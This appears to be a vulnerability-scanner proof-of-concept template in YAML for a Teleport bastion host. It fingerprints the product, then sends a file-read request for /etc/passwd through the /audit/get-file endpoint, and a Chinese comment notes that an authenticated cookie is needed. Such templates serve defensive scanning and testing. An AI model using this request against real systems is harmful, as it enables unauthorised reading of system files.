name: poc-yaml-telnetport-fileread
binding: afc0ac93-0bec-41df-9d0f-ee22bf7a8c2f
manual: true
detail:
    author: 0nion
    vulnerability:
        id: CT-529884
        level: high
    check_action: 需要登录认证后的cookie 审计权限也可以利用，如果存在这个漏洞那么也会存在任意用户登录这个漏洞，登陆的地方存在验证码所以无法编写成一个poc，于是改成三个步骤(1、指纹识别。2、漏洞利用。3、版本判断)
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200 && 'src="/static/js/teleport.js?'.bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&amp;offset=0
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0() && r1()
